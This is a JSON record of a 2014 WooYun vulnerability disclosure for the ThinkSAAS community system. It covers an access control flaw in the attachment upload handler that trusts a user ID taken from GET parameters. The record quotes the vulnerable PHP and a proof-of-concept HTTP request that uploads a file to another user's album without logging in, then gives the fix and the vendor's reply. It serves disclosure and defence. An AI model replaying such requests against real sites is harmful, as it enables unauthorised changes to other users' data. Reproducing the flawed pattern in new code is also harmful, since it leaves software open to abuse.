{"id": 58475, "wybug_id": "wooyun-2014-051121", "wybug_title": "Thinksaas某处平衡权限漏洞", "wybug_corp": "thinksaas.cn", "wybug_author": "phith0n", "wybug_date": "2014-02-20 13:03", "wybug_open_date": "2014-05-21 13:04", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "白盒测试", "平衡权限"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-21：\t细节向公众公开  简要描述： Thinksaas某处平衡权限漏洞，可越权操作。（不用登陆即可） 详细说明：  Thinksaas是一款轻量级开源社区系统，界面我很喜欢。官网在http://www.thinksaas.cn/。出问题的地方在会员上传资料处/app/attach/action/upload.php，这是上传资料处代码：\n...30行\tcase \"do\":\t\t\t\t$userid = intval($_GET['userid']);\t\t$albumid = intval($_GET['albumid']);\t\tif($userid=='0' || $albumid == 0){\t\t\techo '00000';\t\t\texit;\t\t}\t\t\t\t$attachid = $new['attach']->create('attach',array(\t\t\t'userid'\t=> $userid,\t\t\t'locationid'=>aac('user')->getLocationId($userid),\t\t\t'albumid'=>$albumid,\t\t\t'addtime'\t=> date('Y-m-d H:i:s'),\t\t));\t\t\t\t//上传\t\t$arrUpload = tsUpload($_FILES['Filedata'],$attachid,'attach',array('pptx','docx','pdf','jpg','gif','png','rar','zip','doc','ppt','txt'));\t\t\t\tif($arrUpload){\t\t\t$new['attach']->update('attach',array(\t\t\t\t'attachid'=>$attachid,\t\t\t),array(\t\t\t\t'attachname'=>$arrUpload['name'],\t\t\t\t'attachtype'=>$arrUpload['type'],\t\t\t\t'attachurl'=>$arrUpload['url'],\t\t\t\t'attachsize'=>$arrUpload['size'],\t\t\t));\t\t\t\t\t\t\t\t\t//对积分进行处理\t\t\taac('user')->doScore($app,$ac,$ts,$userid);\t\t\t\t\t\t\t\t}\t\t\t\techo $attachid;\t\t\t\tbreak;\n首先就看到前两行的$userid = intval($_GET['userid']);$albumid = intval($_GET['albumid']);它直接以GET方式获得用户id以及资料集id，使得我们可以给任意用户的任意资料集上传资料。（而且不用登陆）之后也没有地方再加以判断，直接插入数据库。   漏洞证明：  发送该数据包：POST /think/index.php?app=attach&ac=upload&ts=do&userid=3&albumid=2 HTTP/1.1Host: localhostUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateConnection: keep-aliveContent-Type: multipart/form-data; boundary=---------------------------12264161285866Content-Length: 201-----------------------------12264161285866Content-Disposition: form-data; name=\"Filedata\"; filename=\"aaaa.txt\"Content-Type: text/plainthis is a txt file~-----------------------------12264161285866--即可给userid为3的用户的albumid为2的资料集上传一个txt文件：\n\n   修复方案：  以session的形式保存userid，不要让用户输入。   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-02-20 13:24 厂商回复： 谢谢您的反馈，连同上传处漏洞一起已修复。再次感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}